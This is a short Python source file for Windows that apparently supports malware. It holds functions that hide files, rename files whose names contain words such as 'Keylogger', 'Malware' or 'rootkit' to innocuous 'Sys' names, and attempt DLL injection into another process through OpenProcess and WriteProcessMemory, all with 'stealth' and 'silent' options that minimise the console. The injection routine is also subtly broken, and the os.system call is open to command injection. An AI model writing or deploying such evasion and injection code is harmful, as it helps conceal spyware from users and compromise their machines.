import os
import ctypes

def hide_file(file_path, stealth=False, silent=False, testing=False):
    try:
        os.system(f'attrib +h {file_path}')
        if testing:
            print(f"File {file_path} hidden.")
    except Exception as e:
        if testing:
            print(f"Error hiding file: {e}")

    if silent:
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 6)  # Minimize the command window

def rename_file_if_keyword(file_path, stealth=False, silent=False, testing=False):
    try:
        keywords = ['Spy', 'ware', 'Klog', 'Keylogger', 'KeyLogger', 'Klogger', 'Mal', 'Malware', 'rootkit', 'adware']
        base, ext = os.path.splitext(file_path)
        for keyword in keywords:
            if keyword in base:
                new_name = base.replace(keyword, 'Sys')
                os.rename(file_path, new_name + ext)
                if testing:
                    print(f"File renamed from {file_path} to {new_name + ext}")
                return new_name + ext
        return file_path
    except Exception as e:
        if testing:
            print(f"Error renaming file: {e}")

    if silent:
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 6)  # Minimize the command window

def inject_into_process(process_name, dll_path, stealth=False, silent=False, testing=False):
    try:
        kernel32 = ctypes.WinDLL('kernel32')
        h_process = kernel32.OpenProcess(0x001F0FFF, False, process_name)
        if h_process:
            kernel32.WriteProcessMemory(h_process, None, dll_path, len(dll_path), None)
            kernel32.CloseHandle(h_process)
            if testing:
                print(f"Injected into process {process_name}")
    except Exception as e:
        if testing:
            print(f"Error injecting into process: {e}")

    if silent:
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 6)  # Minimize the command window